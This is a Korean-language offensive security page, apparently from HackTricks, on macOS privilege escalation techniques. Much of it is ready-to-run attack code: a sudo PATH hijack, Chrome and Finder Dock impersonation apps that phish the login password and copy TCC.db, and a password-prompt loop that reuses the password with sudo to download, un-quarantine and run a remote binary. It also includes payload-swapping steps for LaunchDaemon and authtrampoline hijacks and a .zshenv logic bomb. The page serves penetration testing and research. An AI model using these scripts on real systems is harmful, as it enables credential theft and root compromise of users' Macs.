# macOS Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## TCC Privilege Escalation

TCC privilege escalation을 찾고 있다면 다음으로 이동하세요:


{{#ref}}
macos-security-protections/macos-tcc/
{{#endref}}

## Linux Privesc

Linux 또는 다른 Unix 계열 시스템에 적용되는 많은 privilege-escalation 기법은 macOS에도 적용됩니다. 다음을 참조하세요:


{{#ref}}
../../linux-hardening/linux-basics/linux-privilege-escalation/README.md
{{#endref}}

## User Interaction

### Sudo Hijacking

원본 [Sudo Hijacking 기법은 Linux Privilege Escalation 문서](../../linux-hardening/linux-basics/linux-privilege-escalation/index.html#sudo-hijacking)에서 확인할 수 있습니다.

하지만 macOS는 사용자가 **`sudo`**를 실행할 때 사용자의 **`PATH`**를 **유지합니다**. 즉, 이 공격을 수행하는 또 다른 방법은 피해자가 **sudo를 실행할 때** 실행할 다른 바이너리를 **hijack하는 것**입니다:
```bash
# Let's hijack ls in /opt/homebrew/bin, as this is usually already in the users PATH
cat > /opt/homebrew/bin/ls <<'EOF'
#!/bin/bash
if [ "$(id -u)" -eq 0 ]; then
whoami > /tmp/privesc
fi
/bin/ls "$@"
EOF
chmod +x /opt/homebrew/bin/ls

# victim
sudo ls
```
터미널을 사용하는 사용자는 **Homebrew가 설치되어 있을** 가능성이 매우 높다는 점에 유의하세요. 따라서 **`/opt/homebrew/bin`**의 바이너리를 hijack할 수 있습니다.

### Dock Impersonation

일부 **social engineering**을 사용하면 Dock에서 **예를 들어 Google Chrome을 impersonate**하여 실제로 자신의 스크립트를 실행할 수 있습니다:

{{#tabs}}
{{#tab name="Chrome Impersonation"}}
몇 가지 제안:

- Dock에 Chrome이 있는지 확인하고, 있다면 해당 항목을 **제거**한 다음 Dock 배열에서 **같은 위치에** **fake** **Chrome 항목을 추가**하세요.

<details>
<summary>Chrome Dock impersonation script</summary>
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%Chrome%';

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
cat > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /Applications/Google\\\\ Chrome.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Enter your password to update Google Chrome:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"Applications:Google Chrome.app:Contents:Resources:app.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo $PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c -o /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome
rm -rf /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << 'EOF' > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
</details>

{{#endtab}}

{{#tab name="Finder Impersonation"}}
몇 가지 제안:

- **Dock에서 Finder를 제거할 수 없으므로**, Dock에 추가하려는 경우 가짜 Finder를 실제 Finder 바로 옆에 배치할 수 있습니다. 이를 위해서는 **Dock 배열의 맨 앞에 가짜 Finder 항목을 추가해야 합니다**.
- 또 다른 방법은 Dock에 배치하지 않고 그냥 여는 것입니다. "Finder가 Finder 제어를 요청함"은 그다지 이상하지 않습니다.
- 끔찍한 상자를 표시해 비밀번호를 묻지 않고 **root로 escalate**하는 또 다른 방법은 Finder가 권한이 필요한 작업을 수행하기 위해 실제로 비밀번호를 요청하도록 만드는 것입니다.
- Finder에 새 **`sudo`** 파일을 **`/etc/pam.d`**에 복사하도록 요청합니다. (비밀번호를 묻는 prompt에는 "Finder가 sudo를 복사하려고 합니다"라고 표시됩니다.)
- 새 **Authorization Plugin**을 복사하도록 Finder에 요청합니다. (파일 이름을 제어할 수 있으므로 비밀번호를 묻는 prompt에는 "Finder가 Finder.bundle을 복사하려고 합니다"라고 표시됩니다.)

<details>
<summary>Finder Dock 사칭 script</summary>
```bash
#!/bin/sh

# THIS REQUIRES Finder TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%finder%';

rm -rf /tmp/Finder.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Finder.app/Contents/MacOS
mkdir -p /tmp/Finder.app/Contents/Resources

# Payload to execute
cat > /tmp/Finder.app/Contents/MacOS/Finder.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /System/Library/CoreServices/Finder.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Finder needs to update some components. Enter your password:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"System:Library:CoreServices:Finder.app:Contents:Resources:Finder.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo $PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Finder.app/Contents/MacOS/Finder.c -o /tmp/Finder.app/Contents/MacOS/Finder
rm -rf /tmp/Finder.app/Contents/MacOS/Finder.c

chmod +x /tmp/Finder.app/Contents/MacOS/Finder

# Info.plist
cat << 'EOF' > /tmp/Finder.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Finder</string>
<key>CFBundleIdentifier</key>
<string>com.apple.finder</string>
<key>CFBundleName</key>
<string>Finder</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Finder
cp /System/Library/CoreServices/Finder.app/Contents/Resources/Finder.icns /tmp/Finder.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Finder.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
</details>

{{#endtab}}
{{#endtabs}}

### Password prompt phishing + sudo reuse

Malware는 사용자의 상호작용을 악용해 **sudo를 사용할 수 있는 비밀번호를 탈취**하고 이를 프로그래밍 방식으로 재사용하는 경우가 많습니다. 일반적인 흐름은 다음과 같습니다.

1. `whoami`로 로그인한 사용자를 식별합니다.
2. `dscl . -authonly "$user" "$pw"`가 성공을 반환할 때까지 **비밀번호 프롬프트를 반복**합니다.
3. 자격 증명을 캐시하고(예: `/tmp/.pass`) `sudo -S`(표준 입력을 통한 비밀번호)로 권한이 필요한 작업을 수행합니다.

최소 체인 예시:
```bash
user=$(whoami)
while true; do
read -s -p "Password: " pw; echo
dscl . -authonly "$user" "$pw" && break
done
printf '%s\n' "$pw" > /tmp/.pass
curl -o /tmp/update https://example.com/update
printf '%s\n' "$pw" | sudo -S xattr -c /tmp/update && chmod +x /tmp/update && /tmp/update
```
도난된 password는 이후 **`xattr -c`로 Gatekeeper quarantine을 해제**하고, LaunchDaemons 또는 기타 privileged files를 복사하며, 추가 stages를 non-interactively 실행하는 데 재사용할 수 있습니다.<sup>[[1]](#references)</sup>

## 최신 macOS-specific vectors (2023–2026)

### Deprecated `AuthorizationExecuteWithPrivileges` still usable

`AuthorizationExecuteWithPrivileges`는 10.7에서 deprecated되었지만 **Sonoma/Sequoia에서도 여전히 작동합니다**. 많은 commercial updaters가 신뢰할 수 없는 path와 함께 `/usr/libexec/security_authtrampoline`을 호출합니다. 대상 binary가 user-writable이면 trojan을 심어 legitimate prompt를 이용할 수 있습니다:
```bash
# find vulnerable helper calls
log stream --info --predicate 'eventMessage CONTAINS "security_authtrampoline"'

# replace expected helper
cp /tmp/payload /Users/me/Library/Application\ Support/Target/helper
chmod +x /Users/me/Library/Application\ Support/Target/helper
# when the app updates, the root prompt spawns your payload
```
위의 **masquerading tricks**와 결합해 신뢰할 수 있어 보이는 password dialog를 표시합니다.


### Privileged helper / XPC triage

많은 최신 third-party macOS privesc는 동일한 패턴을 따릅니다. **root LaunchDaemon**이 **`/Library/PrivilegedHelperTools`**에서 **Mach/XPC service**를 노출한 다음, helper가 client를 **검증하지 않거나**, **너무 늦게** 검증하거나(PID race), **user-controlled path/script**를 사용하는 **root method**를 노출합니다. 이는 VPN client, game launcher, updater에서 발생한 최근 helper bug의 배경이 되는 bug class입니다.<sup>[[2]](#references)</sup>

빠른 triage checklist:
```bash
ls -l /Library/PrivilegedHelperTools /Library/LaunchDaemons
plutil -p /Library/LaunchDaemons/*.plist 2>/dev/null | rg 'MachServices|Program|ProgramArguments|Label'
for f in /Library/PrivilegedHelperTools/*; do
echo "== $f =="
codesign -dvv --entitlements :- "$f" 2>&1 | rg 'identifier|TeamIdentifier|com.apple'
strings "$f" | rg 'NSXPC|xpc_connection|AuthorizationCopyRights|authTrampoline|/Applications/.+\.sh'
done
```
특히 다음과 같은 helper에 주의해야 합니다.

- 작업이 `launchd`에 로드된 상태로 남아 **uninstall 이후에도** 계속 요청을 수락하는 helper
- **`/Applications/...`** 또는 non-root 사용자가 쓸 수 있는 기타 경로에서 script를 실행하거나 configuration을 읽는 helper
- race가 가능한 **PID-based** 또는 **bundle-id-only** peer validation에 의존하는 helper

helper authorization bug에 대한 자세한 내용은 [이 페이지](macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/macos-xpc-authorization.md)를 확인하세요.

### PackageKit script environment inheritance (CVE-2024-27822)

Apple이 **Sonoma 14.5**, **Ventura 13.6.7**, **Monterey 12.7.5**에서 이를 수정하기 전까지, **`Installer.app`** / **`PackageKit.framework`**을 통한 사용자가 시작한 install은 **현재 사용자의 environment 내부에서 PKG script를 root로 실행**할 수 있었습니다. 즉, **`#!/bin/zsh`**를 사용하는 package는 공격자의 **`~/.zshenv`**을 로드하고, victim이 package를 install할 때 이를 **root로** 실행할 수 있었습니다.<sup>[[3]](#references)</sup>

이는 **logic bomb**로 특히 흥미롭습니다. 사용자 account에 foothold와 쓸 수 있는 shell startup file만 확보한 다음, 취약한 **zsh-based** installer가 사용자에 의해 실행될 때까지 기다리면 됩니다. 이는 일반적으로 **MDM/Munki** deployment에는 적용되지 않습니다. 이러한 deployment는 root 사용자의 environment 내부에서 실행되기 때문입니다.<sup>[[3]](#references)</sup>
```bash
# inspect a vendor pkg for shell-based install scripts
pkgutil --expand-full Target.pkg /tmp/target-pkg
find /tmp/target-pkg -type f \( -name preinstall -o -name postinstall \) -exec head -n1 {} \;
rg -n '^#!/bin/(zsh|bash)' /tmp/target-pkg

# logic bomb example for vulnerable zsh-based installers
echo 'id > /tmp/pkg-root' >> ~/.zshenv
```
더 깊이 있는 installer-specific abuse 내용을 확인하려면 [이 페이지](macos-files-folders-and-binaries/macos-installers-abuse.md)도 확인하세요.

### `.localized`를 통한 Installer 대상 경로 충돌

일부 third-party installer는 실행 파일이 `/Applications/Target.app` 내부의 고정된 경로로 지정된 root LaunchDaemon을 등록합니다. 공격자가 먼저 **다른 bundle identifier**를 사용해 해당 bundle을 생성할 수 있다면, Installer는 decoy를 유지하고 실제 앱을 `/Applications/Target.localized/Target.app`에 배치할 수 있습니다. Daemon은 여전히 원래 경로를 가리킵니다. 따라서 decoy bundle 내부의 공격자 제어 executable이 이후 root 권한으로 실행될 수 있습니다.<sup>[[8]](#references)</sup>

중요한 사전 조건은 다음과 같습니다:<sup>[[8]](#references)</sup>

1. 공격자가 예상된 application path를 생성하거나 제어할 수 있습니다.
2. package가 충돌하는 bundle을 제거하지 않습니다.
3. privileged job이 해당 bundle 내부의 hard-coded path를 사용합니다.
4. 사용자가 package를 설치하거나 MDM workflow가 package를 설치하고 job을 등록합니다.

이동된 bundle을 찾은 다음, 다음 섹션의 enumeration loop를 사용해 LaunchDaemon target을 검토하세요:<sup>[[8]](#references)</sup>
```bash
find /Applications -type d -name '*.localized' -prune -print
for app in /Applications/*.app; do
[ -d "$app" ] && stat -f '%Su:%Sg %Sp %N' "$app"
done
```
더 안전한 installer는 최종 bundle 위치를 확인하고, 권한이 필요한 executable을 `/Library/PrivilegedHelperTools`와 같이 root가 소유한 위치에 보관합니다. 또한 job을 등록하거나 시작하기 전에 소유권과 code signing을 확인해야 합니다.<sup>[[8]](#references)</sup>

### Writable LaunchDaemon target hijack

LaunchDaemon plist는 root가 소유하고 있어도 `Program` 또는 첫 번째 `ProgramArguments` 항목이 user-writable directory를 가리킬 수 있습니다. executable의 mode만 확인하지 말고 **전체 경로**를 확인해야 합니다. parent directory가 writable이면 attacker가 root-owned executable의 이름을 변경하고 동일한 경로에 replacement를 생성할 수 있습니다. 다음에 job이 시작될 때 replacement가 root 권한으로 실행됩니다. reboot 또는 일반적인 service restart만으로 충분합니다. attacker는 system domain에서 `launchctl bootstrap`을 실행할 permission이 필요하지 않습니다.<sup>[[7]](#references)</sup>

먼저 각 target과 해당 immediate parent를 열거합니다:<sup>[[7]](#references)</sup>
```bash
for p in /Library/LaunchDaemons/*.plist; do
target=$(plutil -extract Program raw -o - "$p" 2>/dev/null)
[ -n "$target" ] ||
target=$(plutil -extract ProgramArguments.0 raw -o - "$p" 2>/dev/null)
[ -n "$target" ] || continue
printf '\n%s -> %s\n' "$p" "$target"
ls -ld "$target" "$(dirname "$target")" 2>/dev/null
done
```
파일 또는 상위 디렉터리에 쓰기 권한이 있는 경우, 원본 바이너리를 보존하고 해당 경로를 실행 가능한 payload로 교체합니다. 그런 다음 이미 로드된 daemon이 다시 시작될 때까지 기다립니다.<sup>[[7]](#references)</sup>
```bash
target=/path/from/the/plist
mv "$target" "$target.real"
cp /tmp/payload "$target"
chmod 755 "$target"
```
### XNU SMR credential-pointer race (CVE-2025-24118)

취약한 `kauth_cred_proc_update` 경로는 SMR readers가 lock 없이 포인터를 로드하는 동안 비원자적 `zalloc_ro_mut` API를 사용해 `proc_ro.p_ucred`를 업데이트했습니다. 공개된 trigger는 특수하게 준비된 setgid 바이너리를 사용합니다. 한 thread는 real 및 effective group IDs 사이를 전환하고, 다른 thread는 `getgid()`와 같은 syscall에 반복적으로 진입합니다.<sup>[[4]](#references)</sup>
```c
// Writer thread inside a setgid binary
while (1) {
setgid(real_gid);
setgid(effective_gid);
}
// Reader thread
while (1) observed_gid = getgid();
```
이를 즉시 root exploit으로 사용할 수 있는 완성된 방법이 아니라 **race primitive**로 간주해야 합니다. 공개된 PoC는 손상된 credential pointer를 입증합니다. 일반적으로 kernel panic으로 끝납니다. 연구자는 Intel에서만 해당 corruption을 재현했으며, 그 결과 생성되는 credential object를 결정론적으로 제어하는 방법은 제시하지 않았습니다. Apple은 macOS 15.3에서 업데이트를 atomic pointer exchange로 변경했습니다.<sup>[[4]](#references)</sup>

### Migration assistant를 통한 SIP bypass ("Migraine", CVE-2023-32369)

이미 root를 획득했더라도 SIP는 system location에 대한 쓰기를 차단합니다. **Migraine** bug는 Migration Assistant entitlement `com.apple.rootless.install.heritable`을 악용하여 SIP bypass를 상속하는 child process를 생성하고 보호된 path(예: `/System/Library/LaunchDaemons`)를 덮어씁니다.<sup>[[5]](#references)</sup> 공격 chain은 다음과 같습니다.

1. 실행 중인 system에서 root를 획득합니다.
2. 조작된 state로 `systemmigrationd`를 트리거하여 attacker-controlled binary를 실행합니다.
3. 상속된 entitlement를 사용하여 SIP-protected file을 patch하고, reboot 이후에도 persistence를 유지합니다.

### NSPredicate/XPC expression smuggling (CVE-2023-23530/23531 bug class)

여러 Apple daemon은 XPC를 통해 **NSPredicate** object를 수락하며, attacker-controlled인 `expressionType` field만 검증합니다. 임의의 selector를 평가하는 predicate를 구성하면 **root/system XPC service**(예: `coreduetd`, `contextstored`)에서 **code execution**을 달성할 수 있습니다. 이를 initial app sandbox escape와 결합하면 **user prompt 없이 privilege escalation**이 가능합니다. predicate를 deserialize하면서 robust visitor가 없는 XPC endpoint를 찾으십시오.<sup>[[6]](#references)</sup>

## TCC - Root Privilege Escalation

### CVE-2020-9771 - mount_apfs TCC bypass and privilege escalation

**모든 user**(unprivileged user 포함)는 `-o noowners`를 사용하여 Time Machine snapshot을 생성하고 mount할 수 있으며, live volume의 ownership check를 bypass하여 해당 snapshot의 **모든 file에 access**할 수 있습니다. 필요한 유일한 privilege는 사용하는 application(예: `Terminal`)에 **Full Disk Access**(`kTCCServiceSystemPolicyAllfiles`)가 부여되어 있는 것입니다.

commands와 전체 설명은 TCC bypasses page에 있습니다:

{{#ref}}
macos-security-protections/macos-tcc/macos-tcc-bypasses/README.md
{{#endref}}

## Sensitive Information

다음 항목은 privilege escalation에 유용할 수 있습니다:


{{#ref}}
macos-files-folders-and-binaries/macos-sensitive-locations.md
{{#endref}}



## References

- [1] [Pentest Partners - 2025년, Infostealer의 해](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [2] [CVE-2024-30165: macOS용 AWS Client VPN Local Privilege Escalation](https://blog.emkay64.com/macos/CVE-2024-30165-finding-and-exploiting-aws-client-vpn-on-macos-for-local-privilege-escalation/)
- [3] [CVE-2024-27822: macOS PackageKit Privilege Escalation](https://khronokernel.com/macos/2024/06/03/CVE-2024-27822.html)
- [4] [TRAVERTINE: CVE-2025-24118](https://jprx.io/cve-2025-24118/)
- [5] [Microsoft "Migraine" SIP bypass (CVE-2023-32369)](https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/)
- [6] [Trellix Advanced Research Center - macOS 및 iOS의 새로운 Privilege Escalation Bug Class (CVE-2023-23530/23531)](https://www.trellix.com/en-sg/blogs/research/trellix-advanced-research-center-discovers-a-new-privilege-escalation-bug-class-on-macos-and-ios/)
- [7] [LaunchDaemon Hijacking: 안전하지 않은 folder permission을 통한 privilege escalation 및 persistence](https://bradleyjkemp.dev/post/launchdaemon-hijacking/)
- [8] [`.localized` directory를 통한 macOS LPE](https://theevilbit.github.io/posts/localized/)
{{#include ../../banners/hacktricks-training.md}}
